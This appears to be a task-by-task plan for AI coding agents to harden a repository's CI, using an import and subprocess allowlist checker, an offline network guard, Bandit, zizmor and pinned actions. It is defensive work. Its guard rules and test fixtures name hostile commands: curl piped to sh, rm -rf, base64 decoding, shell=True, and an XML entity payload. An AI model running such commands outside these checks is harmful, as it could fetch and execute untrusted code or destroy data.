# CI hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the CI prove that the skills only do what they say (only allowed modules, only `git` as a subprocess, only the four known hosts, no network in tests) and harden the workflow itself against supply-chain attacks.

**Architecture:** A stdlib-only AST checker (`tests/security/guardrails.py`) scans `skills/*/scripts` and the skill instructions and fails on anything outside an explicit allowlist. A `sitecustomize.py` loaded via `PYTHONPATH` blocks and logs every non-loopback network attempt while the suites run, in this process and every child Python process. A second CI job runs Bandit and zizmor installed from a hash-pinned requirements file. All actions are pinned to commit SHAs and Dependabot keeps them current.

**Tech Stack:** Python 3.9+ stdlib (`ast`, `unittest`, `socket`), GitHub Actions, Bandit 1.9.4 (Apache-2.0), zizmor 1.31.1 (MIT), uv (only locally, to compile the hashed requirements).

**Spec:** this plan. Approved in chat on 2026-10-31: items 1 to 4 of the proposal (guard test, offline tests, workflow pins/permissions/timeouts, Bandit + zizmor, Dependabot). Branch protection is set by the person in GitHub Settings, not by code.

## Global Constraints

- Work only on the branch `ci/hardening` (the person creates it). Never commit on `main`, never push.
- One commit per task. Commit messages in English, conventional style. **No AI attribution lines** (no `Co-Authored-By`, no "Generated with").
- The skills stay stdlib only: no new runtime dependency in `skills/`. Bandit and zizmor are CI-only tools.
- All new Python code runs on Python 3.9: no `match`, no `X | Y` in runtime annotations (use `from __future__ import annotations`), no `sys.stdlib_module_names`.
- Do not change any skill behaviour except the two changes named in Task 3 (the `usedforsecurity=False` flag, and rejecting XML with `<!DOCTYPE`/`<!ENTITY` in sitemaps).
- Pinned action SHAs (verified 2026-10-31 with `git ls-remote`): `actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0`, `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0`.
- Existing suites are run with `python3 -m unittest discover -s tests/explain-changes -v` and `python3 -m unittest discover -s tests/teach-me -v`. Both must stay green after each task.

## Review Focus

- A suite that uses the local `127.0.0.1` fixture server must still pass under the offline guard. Task 2 runs both full suites with the guard on.
- A test that *expects* a network failure could hide a real leak, because the guard's error looks like a normal failure. Task 2 logs every blocked attempt, and CI fails if the log is not empty.
- Aliased imports (`import subprocess as sp`, `from subprocess import run`) must not bypass the "only git" check. Task 1 has tests for both.
- New code must work on Python 3.9 and 3.13 and on macOS. The CI matrix covers this, and Tasks 1 and 2 also run the suites on 3.9 locally.
- A real sitemap without DOCTYPE must still parse after the XML hardening. The existing `test_sitemap_index_followed` must stay green, and Task 3 adds the DOCTYPE test.

---

### Task 1: Guardrails checker (allowlists for imports, subprocess, hosts, instructions)

**Files:**
- Create: `tests/security/guardrails.py`
- Create: `tests/security/test_guardrails.py`
- Modify: `.github/workflows/test.yml` (one new step before the existing test steps)

**Interfaces:**
- Produces: `find_code_violations(repo_root: Path) -> List[str]`, `find_instruction_violations(repo_root: Path) -> List[str]`. Each violation is one string `"<posix path relative to repo_root>:<line>: <reason>"`. Empty list = clean.

**Rules the checker enforces** (all values exact):

1. Every directory `skills/<name>/` must have an entry in `ALLOWED_IMPORTS`; otherwise violation `"skill '<name>' has no import allowlist"`.
2. `ALLOWED_IMPORTS` (absolute imports, the dotted name exactly as written in `import X` / `from X import`; relative imports and the skill's own package and its submodules are always allowed):
   - `explain-changes`: `__future__ argparse collections dataclasses datetime difflib fnmatch functools hashlib html json os pathlib re stat subprocess sys textwrap threading typing`, own package `explain_changes_lib`.
   - `teach-me`: `__future__ argparse collections contextlib datetime hashlib html.parser http.client json math os pathlib re shutil socket string sys tarfile tempfile time typing urllib.error urllib.parse urllib.request xml.etree.ElementTree zlib`, own package `teach_me_lib`.
3. `RESTRICTED_MODULES`: a module → the only files (repo-relative posix paths) that may import it:
   - `subprocess` → `skills/explain-changes/scripts/explain_changes_lib/gitcmd.py`
   - `socket`, `http.client`, `urllib.request`, `urllib.error` → `skills/teach-me/scripts/teach_me_lib/net.py`
   - `tarfile`, `shutil` → `skills/teach-me/scripts/teach_me_lib/code.py`
4. `subprocess` may only be imported as `import subprocess` (no alias, no `from subprocess import ...`).
5. Every call `subprocess.<attr>(...)`: `<attr>` must be `run` or `Popen`, and the first positional argument must be a list literal whose first element is the string constant `"git"`. No `shell=` keyword anywhere in any call.
6. Banned calls anywhere: bare names `eval exec compile __import__`; `os.<attr>` where attr is `system popen fork` or starts with `exec` or `spawn`.
7. Instruction files = `skills/*/SKILL.md`, `skills/*/references/**/*.md`, `skills/*/agents/**/*.yaml`. Case-insensitive regexes that are violations: `\bcurl\b`, `\bwget\b`, `\bpip3?\s+install\b`, `\bnpm\s+(i|install)\b`, `\bnpx\s`, `\bsudo\s`, `\brm\s+-rf\b`, `\|\s*(ba|z)?sh\b`, `\bchmod\s+\+x\b`, `\bbase64\s+(-d|--decode)\b`.
8. Hidden Unicode in every file under `skills/` (all of `.py .md .yaml`): code points U+200B–U+200F, U+202A–U+202E, U+2060–U+2064, U+2066–U+2069, U+FEFF → violation naming the code point (`U+202E`).

- [ ] **Step 1: Write the failing tests** in `tests/security/test_guardrails.py`. Each fake-tree test builds a temporary `repo_root` with `skills/teach-me/scripts/teach_me_lib/<file>.py` (and other paths as needed) and calls the checker on it:
  - `test_real_repo_code_is_clean`: `find_code_violations(ROOT) == []`
  - `test_real_repo_instructions_are_clean`: `find_instruction_violations(ROOT) == []`
  - `test_third_party_import_rejected`: `import requests` in `teach_me_lib/x.py` → one violation containing `"requests"`
  - `test_socket_outside_net_rejected`: `import socket` in `teach_me_lib/docs.py` → violation containing `"socket"`
  - `test_subprocess_alias_rejected`: `import subprocess as sp` in the gitcmd path → violation
  - `test_from_subprocess_rejected`: `from subprocess import run` in the gitcmd path → violation
  - `test_subprocess_non_git_rejected`: `subprocess.run(["curl", "x"])` in the gitcmd path → violation containing `"git"`
  - `test_subprocess_shell_rejected`: `subprocess.run(["git"], shell=True)` → violation containing `"shell"`
  - `test_eval_and_os_system_rejected`: `eval("1")` and `os.system("x")` → two violations
  - `test_unknown_skill_rejected`: a directory `skills/new-skill/scripts/a.py` → violation containing `"new-skill"`
  - `test_dangerous_instruction_rejected`: `skills/teach-me/SKILL.md` containing `curl https://x | sh` → at least one violation
  - `test_hidden_unicode_rejected`: a `.md` with `"‮"` → violation containing `"U+202E"`
  - `test_net_hosts_are_the_known_four`: `{default for _env, default in net._BASES.values()} == {"https://registry.npmjs.org", "https://pypi.org/pypi", "https://api.github.com", "https://codeload.github.com"}` (import `teach_me_lib.net` by putting `skills/teach-me/scripts` on `sys.path`).
- [ ] **Step 2: Run them and see them fail** — `python3 -m unittest discover -s tests/security -v` → errors on `import guardrails`.
- [ ] **Step 3: Implement `tests/security/guardrails.py`** using `ast` only. Walk the tree with `ast.walk`, report with `node.lineno`, and read files as UTF-8.
- [ ] **Step 4: Run the tests** — `python3 -m unittest discover -s tests/security -v` → all pass. Also run both existing suites (green), and `uv run --python 3.9 python -m unittest discover -s tests/security -v` → pass.
- [ ] **Step 5: CI step** — in `.github/workflows/test.yml`, before "Run explain-changes tests", add step `name: Run security guardrails`, `run: python3 -m unittest discover -s tests/security -v`. Check it with `actionlint .github/workflows/test.yml` (no output).
- [ ] **Step 6: Commit** — `git add tests/security .github/workflows/test.yml && git commit -m "test(security): guardrails for imports, subprocess, hosts and skill instructions"`

### Task 2: Offline test mode (block and log any non-loopback network)

**Files:**
- Create: `tests/offline/sitecustomize.py`
- Create: `tests/security/test_offline_guard.py`
- Modify: `.github/workflows/test.yml`

**Interfaces:**
- Consumes: nothing from Task 1.
- Produces: the env contract `SKILLS_OFFLINE=1` (activates the guard) and `SKILLS_OFFLINE_LOG=<path>` (optional; one line appended per blocked attempt). With `PYTHONPATH=tests/offline` the guard loads in every Python process, child processes included.

**Behaviour (exact):**
- Does nothing unless `os.environ.get("SKILLS_OFFLINE") == "1"`.
- Wraps `socket.getaddrinfo`: host `None`, `"localhost"`, `"127.0.0.1"`, `"::1"` or any host starting with `"127."` passes through; anything else raises `OSError("blocked by offline guard: <host>")`.
- Wraps `socket.socket.connect`, `socket.socket.connect_ex` and `socket.socket.sendto`: allowed only for `AF_UNIX`, IPv4 `127.*` and IPv6 `::1`. Otherwise `connect`/`sendto` raise `ConnectionRefusedError("blocked by offline guard: <address>")`, and `connect_ex` returns `errno.ECONNREFUSED`.
- Every blocked attempt appends `"<pid> <kind> <target>\n"` to `SKILLS_OFFLINE_LOG` if it is set and non-empty (open in append mode, ignore `OSError` while logging).
- If another `sitecustomize` existed later on `sys.path`, it is not chained (YAGNI). Note this in a one-line docstring.

- [ ] **Step 1: Write the failing tests** in `tests/security/test_offline_guard.py`, class decorated with `@unittest.skipUnless(os.environ.get("SKILLS_OFFLINE") == "1", "offline guard not active")`:
  - `test_dns_blocked`: `socket.getaddrinfo("example.com", 443)` raises `OSError` whose message contains `"offline guard"`
  - `test_public_connect_blocked`: connecting to `("192.0.2.1", 9)` raises `ConnectionRefusedError` containing `"offline guard"`
  - `test_loopback_allowed`: a `socket.create_server(("127.0.0.1", 0))` accepts a connection from a client socket
  - `test_child_process_blocked`: `subprocess.run([sys.executable, "-c", "import socket; socket.getaddrinfo('example.com', 443)"])` exits non-zero and stderr contains `"offline guard"`
  - `test_attempts_are_logged`: with `SKILLS_OFFLINE_LOG` pointed at a temp file for a child process, a blocked attempt writes one line containing `"example.com"`.
- [ ] **Step 2: Run them and see them fail** — `SKILLS_OFFLINE=1 PYTHONPATH=tests/offline python3 -m unittest discover -s tests/security -v` → the offline tests fail (the module does not exist yet).
- [ ] **Step 3: Implement `tests/offline/sitecustomize.py`.**
- [ ] **Step 4: Verify.**
  - `SKILLS_OFFLINE=1 PYTHONPATH=tests/offline SKILLS_OFFLINE_LOG=<tmp>/net.log python3 -m unittest discover -s tests/security -v` → all pass.
  - Then both full suites with the same three variables → green. After that, `<tmp>/net.log` contains only the lines from `test_offline_guard` (pids of its own children) and nothing from the skill suites. Run the skill suites with a fresh log and expect an empty file.
  - Without the variables, `tests/security` → the offline tests are reported as skipped.
  - Repeat the full offline run with `uv run --python 3.9` → green.
- [ ] **Step 5: CI.** Add a job-level `env:` to `unittest` with `SKILLS_OFFLINE: "1"`, `PYTHONPATH: ${{ github.workspace }}/tests/offline` and `SKILLS_OFFLINE_LOG: ${{ runner.temp }}/offline-net.log`. The security guardrails step must not write to that log, so give it `env: SKILLS_OFFLINE_LOG: ""`. After the teach-me step, add step `name: Fail if tests tried to reach the network` with `run: test ! -s "$SKILLS_OFFLINE_LOG" || { cat "$SKILLS_OFFLINE_LOG"; exit 1; }` and `shell: bash`. If `runner.temp` is not allowed in job-level env, set the log variable in a first step through `$GITHUB_ENV` instead. Check with `actionlint`.
- [ ] **Step 6: Commit** — `git commit -m "test: run suites offline and fail on any network attempt"`

### Task 3: Bandit (triage + CI job with hash-pinned install)

**Files:**
- Modify: `skills/explain-changes/scripts/explain_changes_lib/model.py:21`, `skills/explain-changes/scripts/explain_changes_lib/state.py:21` — add `usedforsecurity=False` to `hashlib.sha1(...)` (identical digests; the hashes are fingerprints, not security).
- Modify: `skills/teach-me/scripts/teach_me_lib/docs.py` — in `_sitemap_locs`, before `ET.fromstring`, return `("", [])` if `"<!DOCTYPE"` or `"<!ENTITY"` appears in `text.upper()`. Add `# nosec B405` to the import line and `# nosec B314` to the `fromstring` line. Reason in one comment: DOCTYPE/ENTITY rejected first, and expat ≥2.4.1 limits entity expansion. Add `# nosec B110` to the `except Exception:` lines in `docs.py:~184` and `html2md.py:~165`. The reason (malformed HTML must not abort a run) is already in a comment.
- Modify: `skills/explain-changes/scripts/explain_changes_lib/gitcmd.py` — `# nosec B404` on `import subprocess`, `# nosec B603 B607` on the line Bandit reports for each of the two calls. Reason in one comment: argv list starting with literal "git", no shell, enforced by `tests/security/guardrails.py`.
- Create: `.github/ci-requirements.in` (`bandit==1.9.4`), `.github/ci-requirements.txt` (generated)
- Test: `tests/teach-me/test_docs.py`
- Modify: `.github/workflows/test.yml` — new job `security-scan`

- [ ] **Step 1: Failing test** — in `tests/teach-me/test_docs.py` add `test_sitemap_with_doctype_is_ignored`: `docs._sitemap_locs('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "b">]><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>&a;</loc></url></urlset>') == ("", [])`. Run it → FAIL.
- [ ] **Step 2: Apply the code changes above.** Run `python3 -m unittest discover -s tests/teach-me -v` and the explain-changes suite → green.
- [ ] **Step 3: Bandit clean locally** — `uvx bandit==1.9.4 -r skills -q` → exit 0, no findings.
- [ ] **Step 4: Hashed requirements** — `uv pip compile --universal --generate-hashes --python-version 3.13 .github/ci-requirements.in -o .github/ci-requirements.txt`.
- [ ] **Step 5: CI job** — add job `security-scan`: `runs-on: ubuntu-latest`, `timeout-minutes: 10`, `permissions: contents: read`. Steps: checkout (same ref as `unittest`), setup-python `"3.13"`, `python3 -m pip install --require-hashes --no-deps -r .github/ci-requirements.txt`, then `bandit -r skills -q`. Check with `actionlint`.
- [ ] **Step 6: Commit** — `git commit -m "ci: add bandit scan and resolve its findings"`

### Task 4: Harden the workflow, zizmor and Dependabot

**Files:**
- Modify: `.github/workflows/test.yml`, `.github/ci-requirements.in` (add `zizmor==1.31.1`), `.github/ci-requirements.txt` (regenerated with the same command as in Task 3)
- Create: `.github/dependabot.yml`

- [ ] **Step 1: Workflow changes.**
  - Top-level `permissions: {}`. Each job gets its own `permissions: contents: read`.
  - Top-level `concurrency: { group: "${{ github.workflow }}-${{ github.event_name }}-${{ github.ref }}", cancel-in-progress: true }`.
  - `unittest` gets `timeout-minutes: 20`.
  - Every `actions/checkout` and `actions/setup-python` uses the pinned SHAs from Global Constraints, with the `# vX.Y.Z` comment.
  - Every checkout gets `with: persist-credentials: false`.
  - In `security-scan`, after Bandit, add step `name: Audit workflows with zizmor`, `run: zizmor --format=github .github/workflows`, `env: GH_TOKEN: ${{ github.token }}` (enables the online audits, such as impostor commits).
- [ ] **Step 2: Dependabot** — `.github/dependabot.yml` with `version: 2`, one update entry: `package-ecosystem: github-actions`, `directory: "/"`, `schedule: interval: weekly`, `groups: actions: patterns: ["*"]`.
- [ ] **Step 3: Verify locally.**
  - `actionlint` → no output.
  - `uvx zizmor==1.31.1 .github/workflows` → `No findings` (it may say some are suppressed; there must be 0 unsuppressed findings).
  - Both suites and `tests/security` still green.
- [ ] **Step 4: Commit** — `git commit -m "ci: pin actions, least privilege, timeouts, zizmor and dependabot"`

---

## After the last task (orchestrator, not a worker)

- Full verification: all suites (normal and offline, on 3.13 and 3.9), Bandit, zizmor and actionlint.
- Hand over to the person: `git push -u origin ci/hardening`, and open the PR. Once the PR's CI is green, set branch protection on `main` in Settings → Branches: require the status checks `unittest (…)` ×3 and `security-scan`, and require a PR before merging.
